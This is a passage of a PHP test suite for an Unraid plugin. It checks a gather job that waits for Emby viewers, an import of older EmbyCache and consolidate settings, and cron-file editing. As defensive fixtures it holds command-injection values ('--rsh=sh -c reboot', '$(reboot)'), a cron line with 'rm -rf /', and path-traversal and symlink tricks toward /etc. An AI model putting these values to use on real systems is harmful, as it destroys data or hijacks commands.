    $other = fopen("$dir/run/emby-gather-wait.lock", 'c');
    flock($other, LOCK_EX);
    $r = $gate('schedule', [$W]);
    same('gate on schedule: a second start while one waits — nothing new', [false, 'already', [], 1], [$r['go'], $r['result'], $r['slept'], $r['looks']]);
    flock($other, LOCK_UN);
    fclose($other);
    $r = $gate('schedule', [$W], function (int $t, string $dir) { writeAtomic("$dir/office-run.json", jsonEncode(['mode' => 'run', 'started' => $t - 5]), 0600, 0, 0); });
    same('gate on schedule: a real gather from the page meanwhile ends the wait', [false, 'meanwhile', [900]], [$r['go'], $r['result'], $r['slept']]);
    @unlink("$dir/office-run.json");
    $r = $gate('schedule', [$W, $F], function (int $t, string $dir) { writeAtomic("$dir/office-run.json", jsonEncode(['mode' => 'dry', 'started' => $t]), 0600, 0, 0); });
    same('gate on schedule: a dry run meanwhile doesn\'t', [true, 900], [$r['go'], $r['waited']]);
    embyWaitEnd($r['lock'], "$dir/run");
    @unlink("$dir/office-run.json");
    $r = $gate('schedule', [$W], function (int $t, string $dir) { touch("$dir/array-stopped"); });
    same('gate on schedule: the array stopped while waiting — the wait ends', [false, 'array', [900]], [$r['go'], $r['result'], $r['slept']]);
    check('gate on schedule: … nothing left behind', !flockHeld("$dir/run/emby-gather-wait.lock") && !file_exists("$dir/run/emby-gather-wait.json"));

    // during a real run: someone starts watching → the stop request, the run ends after its folder
    $stop = "$tmp/stop.json";
    $null = [0 => ['file', '/dev/null', 'r'], 1 => ['file', '/dev/null', 'w'], 2 => ['file', '/dev/null', 'w']];
    $proc = proc_open(['bash', '-c', 'while [ ! -e "$1" ]; do sleep 0.1; done; exit 3', 'x', $stop], $null, $pipes);
    $r = embyGatherWatch($proc, $stop, fn () => $W, 0);
    same('watch during a run: asked to stop, the run\'s own exit', [3, 'isp3'], [$r['exit'], $r['stopped_for'][0]['user'] ?? null]);
    same('watch during a run: the stop request names who', 'Alien', json_decode((string) @file_get_contents($stop), true)['who'][0]['title'] ?? null);
    @unlink($stop);
    $looked = 0;
    $proc = proc_open(['bash', '-c', 'sleep 0.3; exit 0'], $null, $pipes);
    $r = embyGatherWatch($proc, $stop, function () use (&$looked) { $looked++; return ['state' => 'down', 'who' => []]; }, 0);
    same('watch during a run: Emby down changes nothing', [0, null, false], [$r['exit'], $r['stopped_for'], file_exists($stop)]);
    check('watch during a run: Emby was asked', $looked > 0);

    // the gather itself stops between two folders (dry run, fixture tree, stand-in df)
    foreach (['mnt/disk1/Filme/A', 'mnt/disk2/Filme/A', 'mnt/disk1/Filme/B', 'mnt/disk2/Filme/B', 'mnt/cache', 'user/Filme', 'bin'] as $d) {
        @mkdir("$tmp/$d", 0700, true);
    }
    file_put_contents("$tmp/mnt/disk1/Filme/A/a.mkv", str_repeat('a', 4000));
    file_put_contents("$tmp/mnt/disk2/Filme/A/a.srt", 'sub');
    file_put_contents("$tmp/mnt/disk1/Filme/B/b.mkv", str_repeat('b', 4000));
    file_put_contents("$tmp/mnt/disk2/Filme/B/b.srt", 'sub');
    file_put_contents("$tmp/bin/df", "#!/bin/bash\n[[ -n \"\${STOPME:-}\" ]] && touch \"\$STOPME\"\necho Avail\necho 999999999\n");
    chmod("$tmp/bin/df", 0755);
    file_put_contents("$tmp/consolidate.ini", "BASE_DIRS=('$tmp/user/Filme')\nLOGFILE='$tmp/consolidate.log'\nARRAY_PATTERN='$tmp/mnt/disk[0-9]*'\n"
        . "CACHE_PATTERN='$tmp/mnt/cache'\nEXCLUDE_FILE=''\nDRYRUN=true\nMIN_FREE_GB=0\nDUP_CHECK='size'\n");
    $gather = function (string $stopme) use ($tmp): array {
        @unlink("$tmp/stop");
        @unlink("$tmp/status.json");
        $env = ['PATH' => "$tmp/bin:/usr/bin:/bin", 'HOME' => $tmp, 'LANG' => 'C.UTF-8', 'CONSOLIDATE_CONFIG' => "$tmp/consolidate.ini",
                'CONSOLIDATE_STATUS' => "$tmp/status.json", 'CONSOLIDATE_STOP' => "$tmp/stop", 'CONSOLIDATE_LOCK' => "$tmp/gather.lock",
                'CONSOLIDATE_USER_ROOT' => "$tmp/user", 'STOPME' => $stopme];
        $p = proc_open(['bash', OFFICE_DIR . '/gather/consolidate_master.sh', '--dryrun'], [0 => ['file', '/dev/null', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']], $pipes, $tmp, $env);
        $out = stream_get_contents($pipes[1]) . stream_get_contents($pipes[2]);
        $exit = proc_close($p);
        return [$exit, readJson("$tmp/status.json") ?? [], $out];
    };
    [$exit, $st, $out] = $gather('');
    same('gather without a stop request: every folder', [0, 'ok', 2, 2, 2], [$exit, $st['result'] ?? null, $st['folders'] ?? null, $st['folders_done'] ?? null, $st['moved'] ?? null]);
    [$exit, $st, $out] = $gather("$tmp/stop");
    same('gather: a stop request while a folder is planned — stops after that folder', [3, 'stopped', 2, 1, 1],
        [$exit, $st['result'] ?? null, $st['folders'] ?? null, $st['folders_done'] ?? null, $st['moved'] ?? null]);
    check('gather stopped: no deep clean', !str_contains($out, 'PHASE 3') && str_contains($out, 'Angehalten'), $out);
    same('gather stopped: Jack tells nobody (no failure)', null, embyNotifyOutcome('run', 'stopped', ['errors' => 0]));
    same('gather stopped with errors: those are told', 'errors', embyNotifyOutcome('run', 'stopped', ['errors' => 2]));
    // the last real run for Prometheus: a night skipped for a watcher is no run
    file_put_contents("$tmp/history.json", json_encode(['runs' => [
        ['tool' => 'gather', 'mode' => 'run', 'result' => 'skipped', 'finished' => 300],
        ['tool' => 'gather', 'mode' => 'run', 'result' => 'refused', 'finished' => 200],
        ['tool' => 'gather', 'mode' => 'run', 'result' => 'stopped', 'finished' => 100]]]));
    $fam = array_column(embyMetrics("$tmp/none.json", "$tmp/history.json"), null, 'name');
    $sample = fn (string $name) => array_values(array_filter($fam[$name]['samples'] ?? [], fn ($x) => ($x[0]['tool'] ?? '') === 'gather'))[0][1] ?? null;
    same('metrics: skipped and refused nights are no runs, a stopped one went well', [true, 100],
        [$sample('uso_emby_last_run_ok'), $sample('uso_emby_last_run_end_timestamp_seconds')]);
    hardeningRm($tmp);
}

/**
 * Jack takes over an earlier install of helmi1987's tools (fixtures shaped like EmbyCache 7.2.1
 * and setup_consolidate.sh V11 write them) on a fake server tree: the folder's checks (links,
 * "..", outside, asleep), unknown and new keys, the API key never in an answer to the page, the
 * list and origins merged with Jack's own, bad lines left out, the copies made, the gather's ini.
 */
function testEmbyImport(): void
{
    $tmp = hardeningTmp('embyimport');
    $fs = "$tmp/fs";                      // the fake server: /mnt and /boot below it
    $pool = "$tmp/pool";                  // EmbyCache's pool (load_config() wants a real folder)
    $key = 'FakeKey0123456789abcdefFAKEKEY99';
    $jackKey = 'JackOwnKey0123456789JACKKEY0000';
    foreach (['mnt/user/system/scripts/embycache', 'mnt/user/system/scripts/consolidate', 'mnt/user/system/scripts/badfile',
              'mnt/user/Filme', 'mnt/cache/appdata/old', 'mnt/hive/x', 'boot/config/plugins/user.scripts/scripts/old-embycache',
              'mnt/cache/appdata/UnraidSecretaryOffice/data/embycache', 'mnt/cache/appdata/UnraidSecretaryOffice/data/gather', 'pool', 'run'] as $d) {
        @mkdir(str_starts_with($d, 'pool') || $d === 'run' ? "$tmp/$d" : "$fs/$d", 0700, true);
    }
    symlink('../cache/appdata', "$fs/mnt/user/appdata");                         // an exclusive share, Unraid's own link
    symlink('/tmp', "$fs/mnt/user/linked");                                      // any other link
    symlink('embycache', "$fs/mnt/user/system/scripts/lnk");
    symlink('/etc/hostname', "$fs/mnt/user/system/scripts/badfile/embycache_settings.json");
    file_put_contents("$fs/mnt/user/system/scripts/notes.txt", 'x');
    @mkdir("$fs/mnt/user/system/scripts/hardlink", 0700);
    link("$fs/mnt/user/system/scripts/notes.txt", "$fs/mnt/user/system/scripts/hardlink/consolidate.ini");
    $jack = "$fs/mnt/cache/appdata/UnraidSecretaryOffice/data";
    $ctx = ['emby_dir' => "$jack/embycache", 'gather_dir' => "$jack/gather", 'tmp' => "$tmp/run", 'fs' => $fs,
            'pools' => ['/mnt/cache', '/mnt/hive', $pool], 'shares' => ['Filme', 'Serien', 'system', 'appdata', 'Sleepy'],
            'asleep' => ['disk1' => false, 'disk2' => true, 'cache' => false, 'hive' => true],
            'share_cfg' => fn (string $s): array => ['Filme' => ['shareUseCache' => 'yes', 'shareCachePool' => 'cache', 'shareInclude' => 'disk1'],
                                                      'Serien' => ['shareUseCache' => 'yes', 'shareCachePool' => 'cache', 'shareInclude' => 'disk1'],
                                                      'system' => ['shareUseCache' => 'only', 'shareCachePool' => 'cache'],
                                                      'appdata' => ['shareUseCache' => 'only', 'shareCachePool' => 'cache'],
                                                      'linked' => ['shareUseCache' => 'only', 'shareCachePool' => 'cache'],
                                                      'Sleepy' => ['shareUseCache' => 'no', 'shareInclude' => 'disk2']][$s] ?? [],   // no cfg: the array
            'defaults' => null];
    $err = function (callable $f): string {
        try {
            $f();
            return 'none';
        } catch (Problem $p) {
            return $p->key;
        }
    };

    // the folder: absolute, no "..", in the allowed places, awake, real folders only
    $old = '/mnt/user/system/scripts/embycache';
    same('import folder: a share folder', "$fs$old", embyImportFolder("$old/", $ctx));
    same('import folder: through an exclusive share\'s link to its pool', "$fs/mnt/cache/appdata/old", embyImportFolder('/mnt/user/appdata/old', $ctx));
    same('import folder: User Scripts on the flash', "$fs/boot/config/plugins/user.scripts/scripts/old-embycache",
        embyImportFolder('/boot/config/plugins/user.scripts/scripts/old-embycache', $ctx));
    foreach (['relative/embycache' => 'emby_import_folder', '/mnt/user/system/../system/scripts/embycache' => 'emby_import_folder',
              '/mnt/user/system/./scripts' => 'emby_import_folder', "/mnt/user/sys\ntem" => 'emby_import_folder',
              '/etc' => 'emby_import_where', '/mnt/user0/system' => 'emby_import_where', '/mnt/disks/usb' => 'emby_import_where',
              '/mnt/user' => 'emby_import_where', '/boot/config/plugins/user.scripts/scripts' => 'emby_import_where', '/tmp/x' => 'emby_import_where',
              '/mnt/user/linked' => 'emby_import_link', '/mnt/user/linked/x' => 'emby_import_link', '/mnt/user/system/scripts/lnk' => 'emby_import_link',
              '/mnt/user/Sleepy/old' => 'emby_import_asleep', '/mnt/hive/x' => 'emby_import_asleep', '/mnt/disk2/scripts' => 'emby_import_asleep',
              '/mnt/user/system/nothing' => 'emby_import_missing', '/mnt/user/system/scripts/badfile/embycache_settings.json' => 'emby_import_link',
              '/mnt/user/Nocfg/old' => 'emby_import_asleep', '/mnt/user/system/scripts/notes.txt' => 'emby_import_missing',
              '/mnt/user/appdata/UnraidSecretaryOffice/data/embycache' => 'emby_import_own'] as $path => $want) {
        same('import folder refused: ' . json_encode($path), $want, $err(fn () => embyImportFolder($path, $ctx)));
    }
    same('import: a file that is a link is refused', 'emby_import_file', $err(fn () => embyImportPlan('/mnt/user/system/scripts/badfile', '', $ctx)));
    same('import: a file with a second hard link is refused', 'emby_import_file', $err(fn () => embyImportPlan('', '/mnt/user/system/scripts/hardlink', $ctx)));
    same('import: an empty folder has nothing', 'emby_import_none', $err(fn () => embyImportPlan('/mnt/user/Filme', '', $ctx)));
    same('import: no folder typed', 'emby_import_nothing', $err(fn () => embyImportFolders(['embycache' => ' ', 'gather' => ''])));

    // the old install: EmbyCache 7.2.1's settings (every key of its DEFAULTS), its list, our origins
    $settings = ['cache_path' => "$pool/", 'array_path' => '/mnt/user0/', 'user_path' => '/mnt/user', 'array_disks_glob' => '/mnt/disk[0-9]*',
        'array_source' => 'user0',
        'instances' => [['servername' => 'Nostromo', 'url' => 'http://192.168.7.10:8096', 'api_key' => $key,
                         'path_mappings' => ['/media/Serien' => '/mnt/user/Serien', '/media/Musik' => '', '/media/bad' => '/mnt/user/../etc',
                                             '/media/Gone' => '/mnt/user/Gone/Filme', '/media/Filme' => '/mnt/user/Filme/']]],
        'path_mappings' => ['/media/Filme' => '/mnt/user/Oops'], 'libraries' => ['Filme', 'Serien'],
        'valid_users' => ['u1' => ['budget' => '300 g'], 'bad id!' => [], 'u2' => [], 'u3' => ['budget' => 'lots']],
        'number_episodes' => 3, 'cache_budget' => '2.5t', 'movie_share_percent' => 50, 'max_episodes_per_series' => 0, 'max_resume_items' => 8,
        'max_favorite_series' => 10, 'use_next_up' => true, 'min_free_percent' => 15, 'movie_mode' => 'folder', 'create_share_root' => false,
        'mover_bin' => '/mnt/user/system/evil.sh', 'mover_debug_level' => 0, 'rsync_args' => ['-aAX', '--numeric-ids', '--rsh=sh -c reboot'],
        'fill_tool' => 'rsync', 'cleanup_tool' => 'mover', 'api_timeout' => 10, 'shares_cfg_dir' => '/boot/config/shares',
        'old_option' => 1, 'emby_token' => $key];
    $dir = "$fs$old";
    file_put_contents("$dir/embycache_settings.json", json_encode($settings, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES));
    file_put_contents("$dir/embycache_exclude.txt", implode("\n", ["$pool/Filme/Alien (1979)/Alien.mkv", "$pool/Serien/X/S01/e1.mkv",
        "$pool/Serien/X/S01/e1.mkv", "/mnt/other/Filme/x.mkv", "$pool/Filme/../../etc/passwd", "$pool/NoShare/x.mkv", 'relative.mkv',
        "$pool/Filme", "$pool/Filme/a\x01b.mkv", '', "  $pool/Filme/Brazil/Brazil.mkv  "]) . "\n");
    file_put_contents("$dir/embycache_origin.json", json_encode(["$pool/Filme/Alien (1979)/Alien.mkv" => 'disk1', "$pool/Serien/X/S01/e1.mkv" => 'disk2',
        "$pool/Filme/../x.mkv" => 'disk1', "$pool/Filme/y.mkv" => 'cache', "$pool/Filme/z.mkv" => 3], JSON_UNESCAPED_SLASHES));
    // the gather, as setup_consolidate.sh V11 writes it — plus a list over two lines, a key it never had, a command
    file_put_contents("$fs/mnt/user/system/scripts/consolidate/consolidate.ini", implode("\n", [
        '# consolidate.ini – erzeugt von setup_consolidate.sh (V11)',
        "BASE_DIRS=('/mnt/user/Filme' '/mnt/user/Serien/'",
        "  '/mnt/user/Filme/Sub' \"/mnt/user/Gone\" '/data/x') # the shares",
        "LOGFILE='/mnt/user/PlexMedia/consolidate.log'", '', '# Disks', "ARRAY_PATTERN='/mnt/disk[0-9]*'", "CACHE_PATTERN='/mnt/cache /mnt/nvme'", '',
        "EXCLUDE_FILE='/mnt/user/system/my-excludes.txt'", 'DRYRUN=false', 'MIN_FREE_GB=300', '',
        "CACHE_ONLY_TARGET='most-free'", "DUP_CHECK='cmp'", 'FOO=bar', 'echo $(reboot)', 'EVIL="$(reboot)"']) . "\n");
    // what Jack has already: his own settings (another key), a list and origins
    @mkdir("$jack/embycache", 0700, true);
    @mkdir("$jack/gather", 0700, true);
    $mine = ['cache_path' => $pool, 'instances' => [['servername' => 'Emby', 'url' => 'http://192.168.7.10:8096', 'api_key' => $jackKey,
             'path_mappings' => ['/media/Filme' => '/mnt/user/Filme']]], 'min_free_percent' => 20, 'library_types' => ['Filme' => 'movies', 'Musik' => 'music'],
             'cleanup_tool' => 'rsync', 'max_resume_movies' => 1];
    file_put_contents("$jack/embycache/embycache_settings.json", json_encode($mine, JSON_UNESCAPED_SLASHES));
    file_put_contents("$jack/embycache/embycache_exclude.txt", "$pool/Filme/Alien (1979)/Alien.mkv\n$pool/Filme/Jack Own/j.mkv\n");
    file_put_contents("$jack/embycache/embycache_origin.json", json_encode(["$pool/Filme/Jack Own/j.mkv" => 'disk3', "$pool/Filme/Alien (1979)/Alien.mkv" => 'disk4'], JSON_UNESCAPED_SLASHES));
    file_put_contents("$jack/gather/gather.json", json_encode(['shares' => ['Filme'], 'min_free_gb' => 256, 'dup_check' => 'size']));

    $plan = embyImportPlan("$old/", '/mnt/user/system/scripts/consolidate', $ctx);
    $p = $plan['preview'];
    $e = $p['embycache'];
    $json = json_encode($p, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);
    check('import preview: the old API key never in it', !str_contains($json, $key), $json);
    check('import preview: Jack\'s own API key never in it', !str_contains($json, $jackKey));
    same('import preview: the files found', ['settings' => true, 'exclude' => true, 'origin' => true], $e['found']);
    same('import preview: nothing stops it', [[], []], [$e['blockers'], $p['gather']['blockers']]);
    check('import preview: ready, with a token', $p['ready'] === true && strlen($p['token']) === 40);
    same('import preview: the key found (no value)', 'found', $e['instances'][0]['key']);
    same('import preview: keys this version doesn\'t know — names only', ['old_option', 'emby_token'], $e['dropped']);
    // keys 7.2.1 didn't have: Jack's current value stays; without one, Jack's own default (max_resume_*: the old max_resume_items)
    same('import preview: keys the old install lacks — Jack\'s value stays, else his default',
        [['key' => 'max_resume_movies', 'kept' => true, 'value' => 1], ['key' => 'max_resume_series', 'kept' => false, 'value' => 8],
         ['key' => 'return_to_origin', 'kept' => false, 'value' => true]], $e['defaults']);
    $jackSet = array_column($e['jack'], 'new', 'key');
    same('import preview: Jack\'s values for what runs or isn\'t valid', ['mover_bin' => '', 'rsync_args' => ['-aAX', '--numeric-ids']],
        array_intersect_key($jackSet, ['mover_bin' => 1, 'rsync_args' => 1]));
    check('import preview: array_path with a slash is no change', !isset($jackSet['array_path']));
    $changes = array_column($e['changes'], null, 'key');
    same('import preview: a change, old → new', ['key' => 'min_free_percent', 'old' => 20, 'new' => 15], $changes['min_free_percent'] ?? null);
    same('import preview: a key Jack didn\'t have', ['old' => null, 'new' => '2.5T'], array_intersect_key($changes['cache_budget'] ?? [], ['old' => 1, 'new' => 1]));
    same('import preview: the mappings, the server\'s own over the old global one', [['/media/Filme', '/mnt/user/Filme', true], ['/media/Serien', '/mnt/user/Serien', true],
        ['/media/Musik', '', true], ['/media/Gone', '/mnt/user/Gone/Filme', false]],
        array_map(fn ($m) => [$m['from'], $m['to'], $m['there']], $e['instances'][0]['mappings']));
    same('import preview: a mapping out of the shares left out', ['/media/bad'], $e['instances'][0]['bad_mappings']);
    same('import preview: people', ['n' => 3, 'budgets' => 1, 'bad' => 2], $e['users']);
    same('import preview: the list', ['lines' => 10, 'ok' => 3, 'bad' => 6, 'already' => 1, 'mine' => 2, 'total' => 4],
        array_diff_key($e['exclude'], ['bad_sample' => 1]));
    same('import preview: the origins', ['entries' => 5, 'ok' => 2, 'bad' => 3, 'already' => 1, 'total' => 3, 'unreadable' => false], $e['origin']);
    $g = $p['gather'];
    same('import preview: the gather\'s shares', ['Filme', 'Serien'], $g['shares']);
    same('import preview: shares left out and why', [['/mnt/user/Filme/Sub', 'not_share'], ['/mnt/user/Gone', 'missing'], ['/data/x', 'outside']],
        array_map(fn ($d) => [$d['path'], $d['why']], $g['dropped_shares']));
    same('import preview: the gather\'s unknown keys', ['FOO'], $g['dropped']);
    same('import preview: lines not understood (a command, a $(…))', 2, $g['strange']);
    same('import preview: the gather\'s changes', [['shares', '["Filme"]', '["Filme","Serien"]'], ['min_free_gb', 256, 300], ['dup_check', 'size', 'cmp']],
        array_map(fn ($c) => [$c['key'], $c['old'], $c['new']], $g['changes']));
    same('import preview: what Jack sets himself', ['LOGFILE', 'EXCLUDE_FILE', 'DRYRUN', 'CACHE_ONLY_TARGET', 'CACHE_PATTERN'], array_column($g['jack'], 'key'));
    same('import preview: own exclusions of the old gather said', ['gather_exclude'], array_column($g['warnings'], 'key'));

    // the import: something changed since the preview → refused; then done, with copies of Jack's files
    $again = embyImportPlan($old, '/mnt/user/system/scripts/consolidate', $ctx);
    same('import: the same look gives the same token', $p['token'], $again['preview']['token']);
    file_put_contents("$jack/embycache/embycache_exclude.txt", "$pool/Filme/Jack Own/j.mkv\n$pool/Filme/Alien (1979)/Alien.mkv\n$pool/Filme/New/n.mkv\n");
    check('import: Jack\'s list changed meanwhile — another token', embyImportPlan($old, '/mnt/user/system/scripts/consolidate', $ctx)['preview']['token'] !== $p['token']);
    $plan = embyImportPlan($old, '/mnt/user/system/scripts/consolidate', $ctx);
    $before = ['settings' => file_get_contents("$jack/embycache/embycache_settings.json"), 'exclude' => file_get_contents("$jack/embycache/embycache_exclude.txt"),
               'origin' => file_get_contents("$jack/embycache/embycache_origin.json"), 'gather' => file_get_contents("$jack/gather/gather.json")];
    $done = embyImportApply($plan['do'], $ctx);
    check('import done: the API key never in the answer', !str_contains(json_encode(embyImportScrub($done, $plan['secrets'])), $key));
    $copies = array_map(fn ($f) => basename($f), $done['backups']);
    same('import done: copies of Jack\'s files', array_map(fn ($n) => "$n.before-import-{$done['stamp']}",
        ['embycache_settings.json', 'embycache_exclude.txt', 'embycache_origin.json', 'gather.json', 'consolidate.ini'])[0], $copies[0] ?? null);
    same('import done: copies of all five (consolidate.ini only if it was there)', 4, count($copies));
    same('import done: the copies hold what Jack had', $before, [
        'settings' => (string) @file_get_contents("$jack/embycache/embycache_settings.json.before-import-{$done['stamp']}"),
        'exclude' => (string) @file_get_contents("$jack/embycache/embycache_exclude.txt.before-import-{$done['stamp']}"),
        'origin' => (string) @file_get_contents("$jack/embycache/embycache_origin.json.before-import-{$done['stamp']}"),
        'gather' => (string) @file_get_contents("$jack/gather/gather.json.before-import-{$done['stamp']}")]);
    same('import done: copies are root\'s only', '600', substr(sprintf('%o', fileperms($done['backups'][0])), -3));
    $s = json_decode((string) file_get_contents("$jack/embycache/embycache_settings.json"), true);
    same('import done: the old key stays on the server', $key, $s['instances'][0]['api_key'] ?? null);
    same('import done: settings as shown', [$pool, 15, '', ['-aAX', '--numeric-ids'], true, '/mnt/user0', '2.5T', [], 1, 8, 'mover'],
        [$s['cache_path'], $s['min_free_percent'], $s['mover_bin'], $s['rsync_args'], $s['return_to_origin'], $s['array_path'], $s['cache_budget'], $s['path_mappings'],
         $s['max_resume_movies'], $s['max_resume_series'], $s['cleanup_tool']]);
    check('import done: unknown keys gone', !isset($s['old_option']) && !isset($s['emby_token']));
    same('import done: people with their budget', ['u1' => ['budget' => '300G'], 'u2' => [], 'u3' => []], $s['valid_users']);
    same('import done: library types kept where the name matches', ['Filme' => 'movies'], $s['library_types']);
    same('import done: Jack\'s list and the old one, merged', ["$pool/Filme/Alien (1979)/Alien.mkv", "$pool/Filme/Brazil/Brazil.mkv", "$pool/Filme/Jack Own/j.mkv",
        "$pool/Filme/New/n.mkv", "$pool/Serien/X/S01/e1.mkv"], file("$jack/embycache/embycache_exclude.txt", FILE_IGNORE_NEW_LINES));
    same('import done: origins merged, Jack\'s own win', ["$pool/Filme/Alien (1979)/Alien.mkv" => 'disk4', "$pool/Filme/Jack Own/j.mkv" => 'disk3',
        "$pool/Serien/X/S01/e1.mkv" => 'disk2'], json_decode((string) file_get_contents("$jack/embycache/embycache_origin.json"), true));
    same('import done: the gather\'s settings', ['shares' => ['Filme', 'Serien'], 'min_free_gb' => 300, 'dup_check' => 'cmp'],
        json_decode((string) file_get_contents("$jack/gather/gather.json"), true));
    $ini = (string) file_get_contents("$jack/gather/consolidate.ini");
    check('import done: the gather\'s ini is Jack\'s', str_contains($ini, "BASE_DIRS=('/mnt/user/Filme' '/mnt/user/Serien')\n") && str_contains($ini, "DRYRUN=true\n")
        && str_contains($ini, "MIN_FREE_GB=300\n") && str_contains($ini, "EXCLUDE_FILE='$jack/embycache/embycache_exclude.txt'\n"), $ini);
    same('import done: nothing left in the trial folder', [], glob("$tmp/run/*") ?: []);

    // an older install without cleanup_tool / mover_debug_level: Jack's choices stay; a Jack without settings gets his own
    // defaults (rsync back, as his setup page), never EmbyCache's original mover default
    $older = $settings;
    unset($older['cleanup_tool'], $older['mover_debug_level']);
    file_put_contents("$dir/embycache_settings.json", json_encode($older, JSON_UNESCAPED_SLASHES));
    $withJack = ['emby_dir' => "$tmp/jack2/embycache", 'gather_dir' => "$tmp/jack2/gather"] + $ctx;
    @mkdir("$tmp/jack2/embycache", 0700, true);
    file_put_contents("$tmp/jack2/embycache/embycache_settings.json", json_encode(['cache_path' => $pool, 'cleanup_tool' => 'rsync', 'mover_debug_level' => 1,
        'max_resume_series' => 4, 'max_resume_movies' => null, 'mover_bin' => '/mnt/user/x.sh', 'array_path' => '/mnt/elsewhere'], JSON_UNESCAPED_SLASHES));
    $d = array_column(embyImportPlan($old, '', $withJack)['preview']['embycache']['defaults'], null, 'key');
    same('import, older install: Jack\'s own choices stay', [['cleanup_tool', true, 'rsync'], ['mover_debug_level', true, 1], ['max_resume_series', true, 4]],
        array_map(fn ($k) => [$k, $d[$k]['kept'] ?? null, $d[$k]['value'] ?? null], ['cleanup_tool', 'mover_debug_level', 'max_resume_series']));
    same('import, older install: a null of Jack\'s is no value — his default', [false, 8], [$d['max_resume_movies']['kept'] ?? null, $d['max_resume_movies']['value'] ?? null]);
    $d = array_column(embyImportPlan($old, '', ['emby_dir' => "$tmp/nojack/embycache", 'gather_dir' => "$tmp/nojack/gather"] + $ctx)['preview']['embycache']['defaults'], null, 'key');
    same('import, older install, Jack without settings: his defaults, not the original\'s mover', [['cleanup_tool', false, 'rsync'], ['mover_debug_level', false, 0]],
        array_map(fn ($k) => [$k, $d[$k]['kept'] ?? null, $d[$k]['value'] ?? null], ['cleanup_tool', 'mover_debug_level']));
    unset($older['mover_bin'], $older['array_path']);
    file_put_contents("$dir/embycache_settings.json", json_encode($older, JSON_UNESCAPED_SLASHES));
    $d = array_column(embyImportPlan($old, '', $withJack)['preview']['embycache']['defaults'], null, 'key');
    same('import, older install: a strange mover_bin or Unraid path of Jack\'s never stays', [[false, ''], [false, '/mnt/user0']],
        [[$d['mover_bin']['kept'] ?? null, $d['mover_bin']['value'] ?? null], [$d['array_path']['kept'] ?? null, $d['array_path']['value'] ?? null]]);

    // what stops it: a pool this server lacks, no key (and none of Jack's for that address), EmbyCache saying no
    $bad = $settings;
    $bad['cache_path'] = '/mnt/nowhere';
    $bad['instances'][0]['api_key'] = 'short';
    $bad['instances'][0]['url'] = 'http://elsewhere:8096';
    file_put_contents("$dir/embycache_settings.json", json_encode($bad, JSON_UNESCAPED_SLASHES));
    $b = embyImportPlan($old, '', $ctx)['preview'];
    same('import blocked: a strange pool, no key', ['pool', 'no_key'], array_column($b['embycache']['blockers'], 'key'));
    check('import blocked: not ready', $b['ready'] === false);
    check('import blocked: the strange key never in the preview', !str_contains(json_encode($b), 'short'));
    $bad['instances'][0]['url'] = 'http://192.168.7.10:8096';                    // Jack has a key for that address
    $bad['cache_path'] = $pool;
    $bad['movie_mode'] = 'chaos';
    $bad['max_resume_items'] = 'many';                                         // EmbyCache's own check refuses it
    file_put_contents("$dir/embycache_settings.json", json_encode($bad, JSON_UNESCAPED_SLASHES));
    $b = embyImportPlan($old, '', $ctx)['preview'];
    same('import: no key in the old file — Jack keeps his own', 'jack', $b['embycache']['instances'][0]['key']);
    same('import: a choice EmbyCache doesn\'t know is Jack\'s', 'folder', array_column($b['embycache']['jack'], 'new', 'key')['movie_mode'] ?? null);
    check('import: Jack\'s key never in the preview either', !str_contains(json_encode($b), $jackKey));
    $bad['instances'][0]['path_mappings'] = ['/media/Musik' => ''];            // nothing cached at all: EmbyCache's load_config() says no
    $bad['path_mappings'] = [];
    file_put_contents("$dir/embycache_settings.json", json_encode($bad, JSON_UNESCAPED_SLASHES));
    $b = embyImportPlan($old, '', $ctx)['preview'];
    same('import blocked: EmbyCache\'s own check says no', ['config'], array_column($b['embycache']['blockers'], 'key'));
    check('import blocked: its reason told', str_contains((string) ($b['embycache']['blockers'][0]['params']['detail'] ?? ''), 'path_mappings'));
    file_put_contents("$dir/embycache_settings.json", '[1, 2]');
    same('import blocked: settings that aren\'t an object', ['bad_json'], array_column(embyImportPlan($old, '', $ctx)['preview']['embycache']['blockers'], 'key'));

    // the ini is read, never run
    [$vars, $strange] = embyImportIni("A='it'\\''s' # c\nB=\"x \\\"y\\\"\"\nC=( 'a b'\n# a comment\n c )\nD=(a *)\nE=plain\nF=\nG=a b\nH=\"\$HOME\"\nI=( ~/x )\nJ=#x\n");
    same('import ini: values as bash sees them, nothing expanded', ['A' => "it's", 'B' => 'x "y"', 'C' => ['a b', 'c'], 'E' => 'plain', 'F' => '', 'J' => '#x'], $vars);
    same('import ini: globs, commands, variables refused', 4, $strange);
    hardeningRm($tmp);
}

/** The plugin's cron file against a copy: only the job's own line changes, the order stays */
function testOfficeCron(): void
{
    $tmp = sys_get_temp_dir() . '/office-tests-cron-' . getmypid();
    @mkdir($tmp, 0700, true);
    $file = "$tmp/office.cron";

    officeJobSetSchedule('snapshots', '*/5 * * * *', $file, false);
    officeJobSetSchedule('backup', '0 2 * * *', $file, false);
    same('office cron: both jobs', ['backup' => '0 2 * * *', 'snapshots' => '*/5 * * * *'], officeCronLines($file));
    $lines = array_values(array_filter(explode("\n", (string) file_get_contents($file)), fn ($l) => $l !== '' && $l[0] !== '#'));
    same('office cron: backup line first', '0 2 * * * ' . officeJobCommand('backup'), $lines[0] ?? null);

    officeJobSetSchedule('backup', '30  3 * * 1-5', $file, false);
    same('office cron: changed, spaces tidied', ['backup' => '30 3 * * 1-5', 'snapshots' => '*/5 * * * *'], officeCronLines($file));

    officeJobSetSchedule('gather', '0 4 * * 0', $file, false);
    officeJobSetSchedule('embycache', '5 * * * *', $file, false);
    same('office cron: Jack Emby\'s jobs beside them', ['backup' => '30 3 * * 1-5', 'snapshots' => '*/5 * * * *', 'embycache' => '5 * * * *', 'gather' => '0 4 * * 0'], officeCronLines($file));
    officeJobSetSchedule('embycache', null, $file, false);
    officeJobSetSchedule('gather', null, $file, false);

    officeJobSetSchedule('backup', null, $file, false);
    same('office cron: backup off, snapshots kept', ['snapshots' => '*/5 * * * *'], officeCronLines($file));
    officeJobSetSchedule('snapshots', null, $file, false);
    check('office cron: file gone when empty', !file_exists($file));

    foreach (['0 3 * * * rm -rf /', '61 3 * * *'] as $bad) {
        try {
            officeJobSetSchedule('backup', $bad, $file, false);
            check("office cron refuses $bad", false);
        } catch (Problem $p) {
            same("office cron refuses $bad", 'bad_cron', $p->key);
        }
    }
    try {
        officeJobSetSchedule('rm', '0 3 * * *', $file, false);
        check('office cron refuses an unknown job', false);
    } catch (Problem $p) {
